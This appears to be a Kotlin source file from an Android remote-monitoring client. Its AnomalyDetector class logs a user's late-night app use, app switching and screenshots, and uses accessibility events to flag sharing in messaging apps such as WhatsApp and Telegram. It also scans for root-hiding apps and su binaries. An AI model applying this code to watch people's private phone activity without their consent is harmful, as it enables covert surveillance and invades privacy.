package com.rdm.client

import android.accessibilityservice.AccessibilityService
import android.accessibilityservice.AccessibilityServiceInfo
import android.content.Context
import android.content.pm.PackageManager
import android.os.Build
import android.util.Log
import android.view.accessibility.AccessibilityEvent
import kotlinx.coroutines.*
import kotlinx.coroutines.channels.Channel
import kotlinx.coroutines.flow.Flow
import kotlinx.coroutines.flow.flow
import java.io.File
import java.text.SimpleDateFormat
import java.util.*
import java.util.concurrent.ConcurrentHashMap

/**
 * Comprehensive anomaly detection system for monitoring user behavior,
 * security threats, and unusual system activities.
 */
class AnomalyDetector(private val context: Context) {
    private val TAG = "AnomalyDetector"

    // Coroutine scope for async operations
    private val scope = CoroutineScope(Dispatchers.Default + SupervisorJob())

    // Event channels for different anomaly types
    private val anomalyChannel = Channel<AnomalyEvent>(capacity = Channel.UNLIMITED)

    // Data stores
    private val appUsageHistory = ConcurrentHashMap<String, AppUsageStats>()
    private val appSwitchHistory = mutableListOf<AppSwitchEvent>()
    private val systemSnapshot = mutableMapOf<String, String>()
    private val installedApps = mutableSetOf<String>()

    // Configuration
    private var unusualHoursStart = 22 // 10 PM
    private var unusualHoursEnd = 6    // 6 AM
    private var rapidSwitchThresholdMs = 2000L // 2 seconds
    private var rapidSwitchCount = 3 // Number of rapid switches to trigger alert

    // Root detection evasion patterns
    private val rootHidingApps = setOf(
        "com.devadvance.rootcloak",
        "com.devadvance.rootcloakplus",
        "de.robv.android.xposed.installer",
        "com.saurik.substrate",
        "com.zachspong.temprootremovejb",
        "com.amphoras.hidemyroot",
        "com.formyhm.hideroot",
        "com.formyhm.hiderootpremium",
        "com.koushikdutta.superuser",
        "com.thirdparty.superuser",
        "eu.chainfire.supersu",
        "com.noshufou.android.su",
        "com.topjohnwu.magisk"
    )

    private val suspiciousSystemPaths = listOf(
        "/system/app/Superuser.apk",
        "/sbin/su",
        "/system/bin/su",
        "/system/xbin/su",
        "/data/local/xbin/su",
        "/data/local/bin/su",
        "/system/sd/xbin/su",
        "/system/bin/failsafe/su",
        "/data/local/su",
        "/su/bin/su"
    )

    init {
        Log.d(TAG, "AnomalyDetector initialized")
        loadInitialSystemState()
    }

    /**
     * Update configuration for anomaly detection thresholds
     */
    fun updateConfig(
        unusualHoursStart: Int = this.unusualHoursStart,
        unusualHoursEnd: Int = this.unusualHoursEnd,
        rapidSwitchThresholdMs: Long = this.rapidSwitchThresholdMs,
        rapidSwitchCount: Int = this.rapidSwitchCount
    ) {
        this.unusualHoursStart = unusualHoursStart
        this.unusualHoursEnd = unusualHoursEnd
        this.rapidSwitchThresholdMs = rapidSwitchThresholdMs
        this.rapidSwitchCount = rapidSwitchCount
        Log.d(TAG, "Config updated: unusualHours=$unusualHoursStart-$unusualHoursEnd, " +
                "rapidSwitch=${rapidSwitchThresholdMs}ms x${rapidSwitchCount}")
    }

    /**
     * Get anomaly event flow for monitoring
     */
    fun getAnomalyFlow(): Flow<AnomalyEvent> = flow {
        for (event in anomalyChannel) {
            emit(event)
        }
    }

    /**
     * Process app change event for anomaly detection
     */
    suspend fun onAppChanged(packageName: String, appName: String?) = withContext(Dispatchers.Default) {
        val now = System.currentTimeMillis()
        val hour = SimpleDateFormat("HH", Locale.getDefault()).format(Date(now)).toInt()

        Log.d(TAG, "App changed: $packageName at ${Date(now)}")

        // Check for unusual time usage
        if (isUnusualHour(hour)) {
            scope.launch {
                reportAnomaly(
                    AnomalyType.UNUSUAL_TIME_USAGE,
                    packageName,
                    "App used during unusual hours ($hour:00)",
                    severity = AnomalySeverity.MEDIUM
                )
            }
        }

        // Update app usage stats
        updateAppUsageStats(packageName, appName, now)

        // Check for rapid app switching
        checkRapidAppSwitching(packageName, now)
    }

    /**
     * Check for root detection evasion attempts
     */
    suspend fun checkRootEvasionAttempts() = withContext(Dispatchers.IO) {
        Log.d(TAG, "Checking for root evasion attempts...")

        // Check for root hiding apps
        val installedPackages = context.packageManager.getInstalledApplications(0)
            .map { it.packageName }

        for (rootHidingApp in rootHidingApps) {
            if (rootHidingApp in installedPackages) {
                reportAnomaly(
                    AnomalyType.ROOT_EVASION,
                    rootHidingApp,
                    "Root hiding app detected: $rootHidingApp",
                    severity = AnomalySeverity.HIGH
                )
            }
        }

        // Check for Xposed framework
        try {
            val xposedExists = File("/system/framework/XposedBridge.jar").exists() ||
                              File("/system/bin/app_process").exists()
            if (xposedExists) {
                reportAnomaly(
                    AnomalyType.ROOT_EVASION,
                    "system",
                    "Xposed framework detected - possible root evasion",
                    severity = AnomalySeverity.HIGH
                )
            }
        } catch (e: Exception) {
            Log.e(TAG, "Error checking for Xposed", e)
        }

        // Check for common root indicators being tampered with
        val rootExecutor = RootExecutor()
        for (path in suspiciousSystemPaths) {
            val result = rootExecutor.execute("ls -la $path", useSudo = false, timeoutMs = 1000)
            if (result.success && result.output?.contains("No such file") == false) {
                // Root binary exists - check if it's being hidden
                val checkResult = rootExecutor.execute("which su", useSudo = false, timeoutMs = 1000)
                if (checkResult.success && checkResult.output?.isNotEmpty() == true) {
                    // su is accessible - not hidden, this is normal for rooted devices
                    Log.d(TAG, "Root access available at: ${checkResult.output}")
                } else {
                    // File exists but not in PATH - might be hidden
                    reportAnomaly(
                        AnomalyType.ROOT_EVASION,
                        "system",
                        "Root binary hidden from PATH: $path",
                        severity = AnomalySeverity.MEDIUM
                    )
                }
            }
        }
    }

    /**
     * Check for unusual system modifications
     */
    suspend fun checkSystemModifications() = withContext(Dispatchers.IO) {
        Log.d(TAG, "Checking for system modifications...")

        val rootExecutor = RootExecutor()

        // Check for new installed apps
        val currentApps = context.packageManager.getInstalledApplications(0)
            .map { it.packageName }
            .toSet()

        val newApps = currentApps - installedApps
        if (newApps.isNotEmpty()) {
            for (app in newApps) {
                // Check if it's a system app
                try {
                    val appInfo = context.packageManager.getApplicationInfo(app, 0)
                    if ((appInfo.flags and android.content.pm.ApplicationInfo.FLAG_SYSTEM) != 0) {
                        reportAnomaly(
                            AnomalyType.SYSTEM_MODIFICATION,
                            app,
                            "New system app installed: $app",
                            severity = AnomalySeverity.MEDIUM
                        )
                    }
                } catch (e: Exception) {
                    Log.e(TAG, "Error checking app $app", e)
                }
            }
        }

        installedApps.clear()
        installedApps.addAll(currentApps)

        // Check for modified system properties
        val propsToCheck = listOf(
            "ro.build.display.id",
            "ro.product.model",
            "ro.debuggable",
            "ro.secure"
        )

        for (prop in propsToCheck) {
            val result = rootExecutor.execute("getprop $prop", useSudo = false, timeoutMs = 1000)
            if (result.success && result.output?.isNotEmpty() == true) {
                val currentValue = result.output.trim()
                val previousValue = systemSnapshot[prop]

                if (previousValue != null && currentValue != previousValue) {
                    reportAnomaly(
                        AnomalyType.SYSTEM_MODIFICATION,
                        "system",
                        "System property changed: $prop from '$previousValue' to '$currentValue'",
                        severity = AnomalySeverity.HIGH
                    )
                }

                systemSnapshot[prop] = currentValue
            }
        }

        // Check for SELinux status changes
        val selinuxResult = rootExecutor.execute("getenforce", useSudo = false, timeoutMs = 1000)
        if (selinuxResult.success) {
            val selinuxStatus = selinuxResult.output?.trim()
            if (selinuxStatus == "Permissive") {
                reportAnomaly(
                    AnomalyType.SYSTEM_MODIFICATION,
                    "selinux",
                    "SELinux is in Permissive mode - security reduced",
                    severity = AnomalySeverity.HIGH
                )
            }
        }
    }

    /**
     * Detect content forwarding from monitored apps
     */
    fun detectContentForwarding(packageName: String, contentType: String = "unknown") {
        // Check if this is a sensitive app that shouldn't be sharing content
        val sensitiveApps = setOf(
            "com.whatsapp",
            "com.facebook.katana",
            "com.facebook.orca",
            "com.instagram.android",
            "com.tencent.mm", // WeChat
            "com.snapchat.android",
            "com.telegram.messenger",
            "jp.naver.line.android",
            "com.viber.voip",
            "com.discord"
        )

        if (packageName in sensitiveApps) {
            scope.launch {
                reportAnomaly(
                    AnomalyType.CONTENT_FORWARDING,
                    packageName,
                    "Content forwarding detected in $packageName (type: $contentType)",
                    severity = AnomalySeverity.MEDIUM
                )
            }
        }
    }

    /**
     * Detect screenshot attempts in monitored apps
     */
    fun detectScreenshot(packageName: String) {
        scope.launch {
            reportAnomaly(
                AnomalyType.SCREENSHOT,
                packageName,
                "Screenshot taken in $packageName",
                severity = AnomalySeverity.MEDIUM
            )
        }
    }

    /**
     * Process accessibility event for detailed detection
     */
    fun processAccessibilityEvent(event: AccessibilityEvent?) {
        if (event == null) return

        val packageName = event.packageName?.toString() ?: return

        // Detect content sharing/sharing intents
        if (event.eventType == AccessibilityEvent.TYPE_VIEW_TEXT_CHANGED ||
            event.eventType == AccessibilityEvent.TYPE_VIEW_CLICKED) {

            // Check for share button presses or text selection
            event.text?.forEach { text ->
                if (text.contains("share", ignoreCase = true) ||
                    text.contains("forward", ignoreCase = true) ||
                    text.contains("send", ignoreCase = true)) {
                    detectContentForwarding(packageName, "text_action")
                }
            }
        }

        // Detect long press events (often used for sharing)
        if (event.eventType == AccessibilityEvent.TYPE_VIEW_LONG_CLICKED) {
            // Could be preparing to share content
            Log.d(TAG, "Long click detected in $packageName")
        }
    }

    /**
     * Get user behavior analysis report
     */
    fun getBehaviorAnalysis(): BehaviorAnalysis {
        val now = System.currentTimeMillis()
        val today = SimpleDateFormat("yyyyMMdd", Locale.getDefault()).format(Date(now))

        val totalUsageTime = appUsageHistory.values.sumOf { it.totalSessionTime }
        val mostUsedApps = appUsageHistory.values
            .sortedByDescending { it.totalSessionTime }
            .take(5)
            .map { it.packageName to it.totalSessionTime }

        val unusualUsageApps = appUsageHistory.values.filter { stats ->
            stats.sessionTimes.any { (timestamp, _) ->
                val hour = SimpleDateFormat("HH", Locale.getDefault()).format(Date(timestamp)).toInt()
                isUnusualHour(hour)
            }
        }.map { it.packageName }

        return BehaviorAnalysis(
            date = today,
            totalUsageTime = totalUsageTime,
            mostUsedApps = mostUsedApps,
            unusualTimeApps = unusualUsageApps,
            rapidSwitchingApps = appSwitchHistory
                .groupBy { it.packageName }
                .filter { it.value.size >= rapidSwitchCount }
                .map { it.key }
        )
    }

    // Private helper methods

    private fun isUnusualHour(hour: Int): Boolean {
        return if (unusualHoursStart > unusualHoursEnd) {
            // Range spans midnight (e.g., 22:00 to 06:00)
            hour >= unusualHoursStart || hour < unusualHoursEnd
        } else {
            // Normal range (e.g., 01:00 to 06:00)
            hour in unusualHoursStart until unusualHoursEnd
        }
    }

    private fun updateAppUsageStats(packageName: String, appName: String?, timestamp: Long) {
        val stats = appUsageHistory.getOrPut(packageName) {
            AppUsageStats(
                packageName = packageName,
                appName = appName ?: packageName,
                sessionCount = 0,
                totalSessionTime = 0L,
                sessionTimes = mutableMapOf(),
                lastSeen = timestamp
            )
        }

        stats.sessionCount++
        stats.lastSeen = timestamp

        // Calculate session time if this is a return to the app
        val previousSessions = stats.sessionTimes.keys.sorted()
        if (previousSessions.isNotEmpty()) {
            val lastSession = previousSessions.last()
            val sessionDuration = timestamp - lastSession
            stats.totalSessionTime += sessionDuration
            stats.sessionTimes[timestamp] = sessionDuration
        } else {
            stats.sessionTimes[timestamp] = 0L
        }

        Log.d(TAG, "Updated stats for $packageName: ${stats.sessionCount} sessions, " +
                "${stats.totalSessionTime}ms total")
    }

    private fun checkRapidAppSwitching(packageName: String, timestamp: Long) {
        // Keep only recent switch history
        val cutoffTime = timestamp - 10000L // 10 seconds window
        appSwitchHistory.removeAll { it.timestamp < cutoffTime }

        appSwitchHistory.add(AppSwitchEvent(packageName, timestamp))

        // Check for rapid switching pattern
        if (appSwitchHistory.size >= rapidSwitchCount) {
            val recentSwitches = appSwitchHistory.takeLast(rapidSwitchCount)
            val isRapid = recentSwitches.zipWithNext().all { (first, second) ->
                second.timestamp - first.timestamp <= rapidSwitchThresholdMs
            }

            if (isRapid) {
                val appsInvolved = recentSwitches.map { it.packageName }.distinct()
                scope.launch {
                    reportAnomaly(
                        AnomalyType.RAPID_APP_SWITCHING,
                        appsInvolved.joinToString(", "),
                        "Rapid app switching detected: $rapidSwitchCount apps in ${recentSwitches.last().timestamp - recentSwitches.first().timestamp}ms",
                        severity = AnomalySeverity.LOW
                    )
                }
            }
        }
    }

    private fun loadInitialSystemState() {
        scope.launch(Dispatchers.IO) {
            // Load initial system properties
            val rootExecutor = RootExecutor()
            val propsToCheck = listOf(
                "ro.build.display.id",
                "ro.product.model",
                "ro.debuggable",
                "ro.secure"
            )

            for (prop in propsToCheck) {
                val result = rootExecutor.execute("getprop $prop", useSudo = false, timeoutMs = 1000)
                if (result.success && result.output?.isNotEmpty() == true) {
                    systemSnapshot[prop] = result.output.trim()
                }
            }

            // Load initial apps
            installedApps.addAll(
                context.packageManager.getInstalledApplications(0)
                    .map { it.packageName }
            )

            Log.d(TAG, "Initial system state loaded")
        }
    }

    private suspend fun reportAnomaly(
        type: AnomalyType,
        source: String,
        message: String,
        severity: AnomalySeverity
    ) {
        val event = AnomalyEvent(
            type = type,
            source = source,
            message = message,
            severity = severity,
            timestamp = System.currentTimeMillis()
        )

        Log.w(TAG, "ANOMALY DETECTED: [${event.severity}] ${event.type}: ${event.message}")

        // Send to channel
        anomalyChannel.send(event)
    }

    fun cleanup() {
        scope.cancel()
        anomalyChannel.close()
        Log.d(TAG, "AnomalyDetector cleaned up")
    }
}

// Data classes

data class AppUsageStats(
    val packageName: String,
    val appName: String,
    var sessionCount: Int,
    var totalSessionTime: Long,
    val sessionTimes: MutableMap<Long, Long>,
    var lastSeen: Long
)

data class AppSwitchEvent(
    val packageName: String,
    val timestamp: Long
)

data class BehaviorAnalysis(
    val date: String,
    val totalUsageTime: Long,
    val mostUsedApps: List<Pair<String, Long>>,
    val unusualTimeApps: List<String>,
    val rapidSwitchingApps: List<String>
)

data class AnomalyEvent(
    val type: AnomalyType,
    val source: String,
    val message: String,
    val severity: AnomalySeverity,
    val timestamp: Long
)

enum class AnomalyType {
    UNUSUAL_TIME_USAGE,
    ROOT_EVASION,
    SYSTEM_MODIFICATION,
    RAPID_APP_SWITCHING,
    CONTENT_FORWARDING,
    SCREENSHOT,
    SUSPICIOUS_BEHAVIOR
}

enum class AnomalySeverity {
    LOW,
    MEDIUM,
    HIGH,
    CRITICAL
}
